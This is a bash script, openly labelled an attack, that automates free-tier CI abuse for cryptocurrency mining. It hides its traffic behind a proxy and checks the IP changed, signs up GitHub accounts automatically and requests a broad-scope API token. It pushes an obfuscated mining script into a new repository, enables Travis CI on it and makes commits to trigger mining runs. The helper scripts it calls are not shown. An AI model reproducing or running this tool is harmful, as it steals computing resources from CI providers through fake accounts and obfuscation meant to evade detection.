#!/bin/bash

NUMBER_OF_COMMITS=2
MINING_PERIOD_IN_SECONDS=180

EMAIL=""
USERNAME=""
PASSWORD=""
REPOSITORY_NAME=""
MAIN_DIR="/root"
REPOSITORY_DIR="$MAIN_DIR/repo"

GITHUB_TOKEN=""

wait_for_proxy() {
    cd "$MAIN_DIR"
    original_ip=$(curl ipinfo.io/ip 2> /dev/null)
    fake_ip=$original_ip
    attempts=0

    $MAIN_DIR/bash_scripts/internal_proxy_setup.sh &
    sleep 10

    while [[ $original_ip == $fake_ip ]]; do
        echo "$attempts: original_ip: $original_ip fake_ip: $fake_ip"
        sleep 0.1
        attempts=$(($attempts+1))
        fake_ip=$(timeout 3 curl ipinfo.io/ip 2> /dev/null)
        if [[ $? != 0 ]]; then
            fake_ip=$original_ip
        fi
        if (( $attempts > 20 )); then
            exit 1
        fi
    done

    echo "original_ip: $original_ip"
    echo "fake_ip: $fake_ip"
    echo "connected!"
}

get_github_account() {
    echo "signing up for github ..."
    cd "$MAIN_DIR/npm_project"

    attempts=0
	ret_val=1
	while [[ $ret_val -ne 0 ]]
	do
        lines=$(node scripts/signup.js)
		ret_val=$?
        attempts=$(($attempts+1))
        if (( $attempts > 7 )); then
            echo "could not create github account, attempted $attempts times"
            exit 1
        fi
	done

    echo "$lines"

    for line in $lines
    do
        if [ -z "$EMAIL"  ]; then
            EMAIL="$line"
        elif [ -z "$USERNAME" ]; then
            USERNAME="$line"
        elif [ -z "$PASSWORD" ]; then
            PASSWORD="$line"
        fi
    done

    echo "done!"
}

create_and_config_repository() {
    set -e
    REPOSITORY_NAME="repo_$USERNAME"_"$PASSWORD"
    REPOSITORY_DIR="$MAIN_DIR/$REPOSITORY_NAME"

    cd "$MAIN_DIR"
    curl -u "$USERNAME:$PASSWORD" https://api.github.com/user/repos -d "{\"name\":\"$REPOSITORY_NAME\"}"
	git clone https://github.com/$USERNAME/$REPOSITORY_NAME
    cd "$REPOSITORY_DIR"
	git config --local user.name $USERNAME
	git config --local user.email $EMAIL
	git config --local user.password $PASSWORD
	git config remote.origin.url \
		https://$USERNAME:$PASSWORD@github.com/$USERNAME/$REPOSITORY_NAME.git
    echo "Hello World!" > hello.txt
    cp "$MAIN_DIR/bash_scripts/travis.yml" ./.travis.yml

    head -2 "$MAIN_DIR/bash_scripts/mine.sh" > ./temp.sh
    echo "TIME=$MINING_PERIOD_IN_SECONDS" >> temp.sh
    tail -n +4 "$MAIN_DIR/bash_scripts/mine.sh" >> temp.sh
    bash-obfuscate temp.sh -o ./a.sh
    rm temp.sh

    echo "#!/bin/bash"                              >  ./temp.sh
    echo ""                                         >> ./temp.sh
    echo "USERNAME=\"$USERNAME\""                   >> ./temp.sh
    echo "PASSWORD=\"$PASSWORD\""                   >> ./temp.sh
    echo "REPOSITORY_NAME=\"$REPOSITORY_NAME\""     >> ./temp.sh
    tail -n +6 "$MAIN_DIR/bash_scripts/resume.sh"   >> ./temp.sh
    bash-obfuscate temp.sh -o ./b.sh
    rm temp.sh

    chmod +x ./a.sh ./b.sh

    git add .
    git commit -am "Hello World"
    git push origin master
    set +e
}

make_travisci_to_track_repository() {
    echo "activating travis ci"
    cd "$REPOSITORY_DIR"

    expect -c '
    spawn travis
    set prompt ":|#|\\\$"
    expect "Shell completion not installed. Would you like to install it now? |y|"
    send "yes\r"
    interact -o -nobuffer -re $prompt return
    '

    curl -d '{"scopes":["repo", "admin:org", "admin:repo_hook", "user"],"note":"t1"}'\
        https://$USERNAME:$PASSWORD@api.github.com/authorizations > token_result.json

    GITHUB_TOKEN=$(node "$MAIN_DIR/npm_project/scripts/token_extractor.js")

    travis login -g $GITHUB_TOKEN

	travis sync
	travis_ret_val=$?
	while [[ $travis_ret_val -ne 0 ]]
	do
		sleep 1
		echo "travis sync failed, retrying ..."
		travis sync
		travis_ret_val=$?
	done

    rm -f token_result.json

    travis enable -r $USERNAME/$REPOSITORY_NAME
}

make_commits() {
    cd "$REPOSITORY_DIR"

    echo "$NUMBER_OF_COMMITS" >> hello.txt
    git add .
    git commit -m "commit $NUMBER_OF_COMMITS"
    git push origin master
}

print_account_info_for_manual_verification() {
    echo "EMAIL: $EMAIL"
    echo "USERNAME: $USERNAME"
    echo "PASSWORD: $PASSWORD"
    echo "#commits: $NUMBER_OF_COMMITS"
    echo "mining period per commit: $MINING_PERIOD_IN_SECONDS"
}

attack() {
    wait_for_proxy
    get_github_account
    create_and_config_repository
    make_travisci_to_track_repository
    make_commits
    print_account_info_for_manual_verification
}

main() {
    NUMBER_OF_COMMITS=$1
    MINING_PERIOD_IN_SECONDS=$2
    attack
}

main "$@"
